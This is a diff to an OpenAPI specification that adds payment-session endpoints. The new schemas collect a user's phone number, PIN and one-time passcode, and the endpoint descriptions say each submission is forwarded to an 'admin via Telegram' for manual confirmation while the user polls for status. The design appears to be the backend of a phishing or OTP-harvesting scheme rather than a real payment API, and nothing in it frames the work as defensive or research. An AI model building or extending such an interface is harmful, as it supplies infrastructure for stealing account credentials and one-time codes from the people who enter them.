@@ -10,6 +10,8 @@ servers:
 tags:
   - name: health
     description: Health operations
+  - name: sessions
+    description: Payment session operations
 paths:
   /healthz:
     get:
@@ -24,6 +26,77 @@ paths:
             application/json:
               schema:
                 $ref: "#/components/schemas/HealthStatus"
+
+  /sessions:
+    post:
+      operationId: createSession
+      tags: [sessions]
+      summary: Create a new payment session
+      description: Creates a session and notifies admin via Telegram
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              $ref: "#/components/schemas/SessionInput"
+      responses:
+        "201":
+          description: Session created
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/Session"
+
+  /sessions/{id}:
+    get:
+      operationId: getSession
+      tags: [sessions]
+      summary: Get session status
+      description: Poll this endpoint to get the current session status
+      parameters:
+        - name: id
+          in: path
+          required: true
+          schema:
+            type: string
+      responses:
+        "200":
+          description: Session found
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/Session"
+        "404":
+          description: Session not found
+
+  /sessions/{id}/submit-otp:
+    post:
+      operationId: submitOtp
+      tags: [sessions]
+      summary: Submit OTP entered by user
+      description: Sends OTP to admin via Telegram for confirmation
+      parameters:
+        - name: id
+          in: path
+          required: true
+          schema:
+            type: string
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              $ref: "#/components/schemas/OtpInput"
+      responses:
+        "200":
+          description: OTP submitted
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/Session"
+        "404":
+          description: Session not found
+
 components:
   schemas:
     HealthStatus:
@@ -34,3 +107,38 @@ components:
       required:
         - status
 
+    Session:
+      type: object
+      required: [id, status, phone, packageName, packagePrice]
+      properties:
+        id:
+          type: string
+        status:
+          type: string
+          description: "pending | otp_submitted | verified | rejected"
+        phone:
+          type: string
+        packageName:
+          type: string
+        packagePrice:
+          type: string
+
+    SessionInput:
+      type: object
+      required: [phone, pin, packageName, packagePrice]
+      properties:
+        phone:
+          type: string
+        pin:
+          type: string
+        packageName:
+          type: string
+        packagePrice:
+          type: string
+
+    OtpInput:
+      type: object
+      required: [otp]
+      properties:
+        otp:
+          type: string
